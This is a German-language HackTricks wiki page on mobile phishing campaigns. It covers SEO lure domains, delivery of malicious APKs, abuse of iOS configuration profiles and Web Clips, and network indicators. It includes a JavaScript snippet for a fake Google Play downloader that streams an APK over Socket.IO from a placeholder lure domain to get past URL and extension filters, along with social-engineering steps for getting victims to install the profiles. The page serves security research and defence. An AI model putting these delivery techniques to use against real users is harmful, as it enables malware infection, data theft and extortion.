# Mobile Phishing und Verteilung bösartiger Apps (Android und iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Diese Seite behandelt Techniken, die von Threat Actors zur Verteilung **bösartiger Android-APKs** und **iOS-Konfigurationsprofile für Mobilgeräte** über Phishing (SEO, Social Engineering, Fake Stores, Dating-Apps usw.) eingesetzt werden.
> Das Material basiert auf der von Zimperium zLabs (2025) aufgedeckten SarangTrap-Kampagne und weiterer öffentlicher Forschung.<sup>[[1]](#references)</sup>

## Angriffsablauf

1. **SEO-/Phishing-Infrastruktur**
* Dutzende ähnlich aussehende Domains registrieren (Dating, Cloud Share, Autodienst …).
– Keywords in der lokalen Sprache und Emojis im `<title>`-Element verwenden, um in Google ein höheres Ranking zu erzielen.
– Sowohl Installationsanweisungen für Android (`.apk`) als auch für iOS auf derselben Landingpage hosten.
2. **Download der ersten Stufe**
* Android: direkter Link zu einer *unsignierten* APK oder einer APK aus einem „Third-Party Store“.
* iOS: `itms-services://`- oder einfacher HTTPS-Link zu einem bösartigen **mobileconfig**-Profil (siehe unten).
3. **Verhalten nach der Android-Installation**
* C2-gesteuerte Ausführung, Missbrauch von Berechtigungen, Umgehung von Dropper-Schutzmechanismen, Datensammlung im Hintergrund und weiteres Malware-Verhalten nach der Installation werden auf der weiter unten verlinkten speziellen Seite zu Android Malware Post-Exploitation behandelt.
4. **iOS-Zustellungstechnik**
* Ein einzelnes **mobile-configuration profile** kann unter anderem `PayloadType=com.apple.sharedlicenses` und `com.apple.managedConfiguration` anfordern, um das Gerät in eine MDM-ähnliche Überwachung einzubinden.
* Anweisungen für Social Engineering:
1. Einstellungen öffnen ➜ *Profil geladen*.
2. Dreimal auf *Installieren* tippen (Screenshots auf der Phishing-Seite).
3. Dem unsignierten Profil vertrauen ➜ Der Angreifer erhält ohne App-Store-Prüfung Zugriff auf die Berechtigungen für *Kontakte* und *Fotos*.
5. **iOS Web Clip Payload (Phishing-App-Symbol)**
* `com.apple.webClip.managed`-Payloads können **eine Phishing-URL mit einem gebrandeten Symbol/Label auf dem Home-Bildschirm anheften**.
* Web Clips können **im Vollbildmodus** ausgeführt werden (die Browser-Oberfläche wird ausgeblendet) und als **nicht entfernbar** markiert werden, sodass das Opfer das Profil löschen muss, um das Symbol zu entfernen.<sup>[[3]](#references)</sup>
6. **Netzwerkschicht**
* Einfaches HTTP, häufig auf Port 80 mit einem HOST-Header wie `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (kein TLS → leicht zu erkennen).

## Android Malware Post-Exploitation

Informationen zu Android-Malware-Tradeware nach der Installation, etwa C2, Accessibility-Missbrauch, Overlays, ATS-Automatisierung, gestaffeltes DEX-Laden, Premium-SMS und Persistenz, finden sich auf der folgenden speziellen Seite:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK-Schmuggel über Socket.IO/WebSocket und gefälschte Google-Play-Seiten

Angreifer ersetzen statische APK-Links zunehmend durch einen in Google-Play-ähnliche Köder eingebetteten Socket.IO-/WebSocket-Kanal. Dadurch wird die Payload-URL verborgen, URL-/Erweiterungsfilter werden umgangen und eine realistische Installationsoberfläche bleibt erhalten.<sup>[[2]](#references)[[4]](#references)</sup>

Typischer, in freier Wildbahn beobachteter Client-Ablauf:

<details>
<summary>Gefälschter Play-Downloader über Socket.IO (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Warum es einfache Kontrollen umgeht:
- Es wird keine statische APK-URL offengelegt; der payload wird im Speicher aus WebSocket-Frames rekonstruiert.
- URL-/MIME-/Erweiterungsfilter, die direkte `.apk`-Antworten blockieren, übersehen möglicherweise Binärdaten, die über WebSockets/Socket.IO getunnelt werden.
- Crawler und URL-Sandboxes, die keine WebSockets ausführen, rufen den payload nicht ab.

Siehe auch WebSocket tradecraft und tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Die dunkle Seite der Romantik: SarangTrap-Erpressungskampagne](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Payload-Einstellungen für Web Clips auf Apple-Geräten](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banker-Trojaner mit indonesischen und vietnamesischen Android-Nutzern als Ziel](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
